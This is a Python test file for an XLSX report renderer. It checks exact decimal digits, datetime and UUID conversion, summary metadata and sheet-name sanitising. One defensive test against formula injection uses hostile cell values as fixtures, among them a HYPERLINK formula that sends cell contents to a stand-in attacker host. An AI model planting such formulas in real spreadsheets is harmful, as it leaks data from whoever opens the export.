"""The spreadsheet a background report produces (master rules sections 25, 84).

``render_report_xlsx`` is the one piece of the background path that can be tested
without a broker, a worker or a database: plain mappings in, bytes out. What is
asserted here is not "a file was produced" but the three things that make the
file trustworthy.

**Exact numbers.** A ``Decimal`` reaches the file with its exact digits.
Converting to ``float`` on the way out would reintroduce, in the artefact
somebody reconciles against, precisely the binary rounding section 84 exists to
keep out of the system.

**It renders at all.** Every report row carries timezone-aware datetimes and
UUIDs, and openpyxl refuses both outright. A conversion missed here does not
produce a slightly wrong spreadsheet - it raises, and the user's report never
arrives.

**It says what it is.** An artefact outlives the request that asked for it, so it
has to carry its period, its filters and whether it was truncated.
"""

from __future__ import annotations

import io
import uuid
import zipfile
from datetime import UTC, date, datetime
from decimal import Decimal

from openpyxl import load_workbook

from src.modules.reports.models import ReportKey
from src.modules.reports.service import columns_for, definition_for
from src.workers.tasks.reports import render_report_xlsx

COLUMNS = [
    {"name": "code", "label": "Code", "kind": "text"},
    {"name": "total_amount", "label": "Total amount", "kind": "number"},
    {"name": "created", "label": "Created", "kind": "datetime"},
    {"name": "due", "label": "Due", "kind": "date"},
    {"name": "sales_order_id", "label": "Sales order id", "kind": "id"},
    {"name": "flagged", "label": "Flagged", "kind": "bool"},
]

META = {
    "generated_at": "2026-09-10T09:30:00+00:00",
    "period": "2026-08-01 to 2026-08-31",
    "filters": "search=SO",
    "truncated": False,
}


def _row(**overrides: object) -> dict[str, object]:
    return {
        "code": "SO/2026-27/00042",
        "total_amount": Decimal("1234.5678"),
        "created": datetime(2026, 8, 15, 6, 30, tzinfo=UTC),
        "due": date(2026, 8, 31),
        "sales_order_id": uuid.uuid4(),
        "flagged": True,
        **overrides,
    }


def _load(payload: bytes):
    return load_workbook(io.BytesIO(payload))


def test_the_workbook_leads_with_a_header_row_of_the_reports_own_labels() -> None:
    workbook = _load(render_report_xlsx("Sales order status", COLUMNS, [_row()], META))
    sheet = workbook["Sales order status"]
    assert [cell.value for cell in sheet[1]] == [column["label"] for column in COLUMNS]


def test_a_decimal_is_written_to_the_file_with_its_exact_digits() -> None:
    """The digits in the file are the digits the report produced.

    Asserted against the stored XML rather than against a read-back value on
    purpose: XLSX stores every number as a double, so openpyxl hands back a
    float whatever was written. What is under test is the *write* side - that
    ``1234.5678`` is not passed through ``float()`` on the way out and stored as
    ``1234.5677999999999``, which is what section 84 is about and what an
    accountant reconciling the artefact would find.
    """
    payload = render_report_xlsx("Sales order status", COLUMNS, [_row()], META)
    with zipfile.ZipFile(io.BytesIO(payload)) as archive:
        sheet_xml = archive.read("xl/worksheets/sheet1.xml").decode()
    assert "<v>1234.5678</v>" in sheet_xml


def test_a_timezone_aware_datetime_is_written_as_naive_utc() -> None:
    # XLSX has no timezone concept and openpyxl refuses an aware value outright,
    # so this conversion is what stops the whole export failing over one column.
    workbook = _load(render_report_xlsx("Sales order status", COLUMNS, [_row()], META))
    written = workbook["Sales order status"].cell(row=2, column=3).value
    assert isinstance(written, datetime)
    assert written.tzinfo is None
    assert written == datetime(2026, 8, 15, 6, 30, tzinfo=None)  # noqa: DTZ001 - XLSX is naive


def test_a_uuid_is_written_as_its_text_form() -> None:
    row = _row()
    workbook = _load(render_report_xlsx("Sales order status", COLUMNS, [row], META))
    assert workbook["Sales order status"].cell(row=2, column=5).value == str(
        row["sales_order_id"]
    )


def test_a_missing_value_leaves_an_empty_cell_rather_than_the_word_none() -> None:
    sparse = {"code": "SO/1"}
    workbook = _load(render_report_xlsx("Sales order status", COLUMNS, [sparse], META))
    assert workbook["Sales order status"].cell(row=2, column=2).value is None


def test_an_empty_report_still_produces_a_readable_workbook() -> None:
    # A report with no rows is a legitimate answer - "nothing is overdue" - and
    # must not come back as a broken file.
    workbook = _load(render_report_xlsx("Order delay", COLUMNS, [], META))
    sheet = workbook["Order delay"]
    assert sheet.max_row == 1
    assert [cell.value for cell in sheet[1]] == [column["label"] for column in COLUMNS]


def test_the_summary_sheet_states_the_period_the_filters_and_the_truncation() -> None:
    workbook = _load(render_report_xlsx("Sales order status", COLUMNS, [_row()], META))
    summary = workbook["Summary"]
    stated = {summary.cell(row=r, column=1).value: summary.cell(row=r, column=2).value
              for r in range(1, summary.max_row + 1)}
    assert stated["Report"] == "Sales order status"
    assert stated["Period"] == "2026-08-01 to 2026-08-31"
    assert stated["Filters"] == "search=SO"
    assert stated["Rows"] == 1
    assert stated["Truncated"] == "no"


def test_a_truncated_export_says_so_on_its_face() -> None:
    # A truncated export that looked complete would be read as "there were only
    # this many rows", which is the worst possible failure for a report.
    workbook = _load(
        render_report_xlsx("Sales order status", COLUMNS, [_row()], {**META, "truncated": True})
    )
    summary = workbook["Summary"]
    stated = {summary.cell(row=r, column=1).value: summary.cell(row=r, column=2).value
              for r in range(1, summary.max_row + 1)}
    assert stated["Truncated"] == "yes"


def test_a_title_excel_would_reject_is_sanitised_rather_than_raising() -> None:
    # Report titles are free text; Excel refuses []:*?/\\ and anything over 31
    # characters. Failing the export over a punctuation mark would be absurd.
    payload = render_report_xlsx("Courier / transport tracking: live", COLUMNS, [], META)
    names = _load(payload).sheetnames
    assert all(len(name) <= 31 for name in names)
    assert all(not set(name) & set("[]:*?/\\") for name in names)


def test_every_report_can_be_rendered_from_its_own_column_definition() -> None:
    # The writer is driven by the row schema, so a report whose columns openpyxl
    # cannot write would only be discovered when somebody exported it.
    for key in ReportKey:
        definition = definition_for(key)
        columns = [column.model_dump() for column in columns_for(definition.row_model)]
        payload = render_report_xlsx(definition.title, columns, [], META)
        assert payload[:2] == b"PK", f"{key} produced no workbook"


def test_a_stored_value_that_looks_like_a_formula_is_written_as_text() -> None:
    """Master data reaches the workbook as text, never as something to execute.

    Any user who can name an item or a vendor can store a value beginning with
    ``=``. Written verbatim, a spreadsheet reads it as a formula rather than as
    a name - so ``=HYPERLINK(...)`` in an item name is a live link in every
    export that surfaces it, and the DDE forms can prompt the reader to run a
    command. The reader is generally not the person who typed it, and often has
    more authority.

    The remedy is the conventional one: a leading apostrophe, which spreadsheets
    strip on display and treat the remainder as text. Applied in the renderer
    and not at input, because ``=`` is legitimate in a part description and the
    JSON export is unaffected by it.
    """
    hostile = [
        '=HYPERLINK("http://attacker.example/?c="&A1,"Click")',
        "+1+1",
        "-2+3",
        "@SUM(A1)",
        "	SUM(A1)",
    ]
    rows = [_row(code=value) for value in hostile]
    sheet = _load(render_report_xlsx("Sales order status", COLUMNS, rows, META))[
        "Sales order status"
    ]

    code_column = next(i for i, c in enumerate(COLUMNS, start=1) if c["name"] == "code")
    for offset, original in enumerate(hostile, start=2):
        written = sheet.cell(row=offset, column=code_column).value
        assert written == f"'{original}", f"{original!r} was written unguarded"
        # The apostrophe is a display convention, not a corruption: the value a
        # reader sees is still the value that was stored.
        assert written[1:] == original


def test_ordinary_text_and_numbers_are_left_exactly_as_they_are() -> None:
    """The guard must not tax every other cell in the file.

    A leading apostrophe on a normal name would appear in the export somebody
    reconciles against, and a Decimal turned into a prefixed string would stop
    the column adding up at all.
    """
    row = _row(code="SO-2026-0001")
    sheet = _load(render_report_xlsx("Sales order status", COLUMNS, [row], META))[
        "Sales order status"
    ]

    for index, column in enumerate(COLUMNS, start=1):
        written = sheet.cell(row=2, column=index).value
        if isinstance(written, str):
            assert not written.startswith("'"), f"{column['name']} was needlessly quoted"
